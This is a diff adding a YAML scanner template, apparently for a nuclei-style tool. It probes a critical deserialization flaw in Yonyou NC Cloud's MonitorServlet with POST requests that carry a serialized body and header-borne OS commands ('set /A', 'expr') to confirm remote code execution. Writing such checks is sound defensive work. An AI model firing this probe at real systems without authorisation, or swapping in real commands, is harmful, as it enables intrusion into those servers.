@@ -1,0 +1,26 @@
+id: yaml-poc-yonyou-yonyou_nc_cloud-deserialization-CT-531176
+info:
+  name: Yaml Poc Yonyou Yonyou_Nc_Cloud Deserialization Ct 531176
+  author: chunguo.hou
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-yonyou-yonyou_nc_cloud-deserialization-CT-531176'
+  tags: deserialization
+  reference:
+  - https://lfysec.top/2021/09/10/用友NC挖掘笔记/
+http:
+- method: POST
+  path:
+  - /servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet
+  body: '{{rb}}'
+  headers:
+    Content-Type: multipart/form-data;
+    X-T0KEN-INF0: set /A {{rInt1}}+{{rInt2}}
+  redirects: false
+- method: POST
+  path:
+  - /servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet
+  body: '{{rb}}'
+  headers:
+    Content-Type: multipart/form-data;
+    X-T0KEN-INF0: expr {{rInt1}}+{{rInt2}}
+  redirects: false
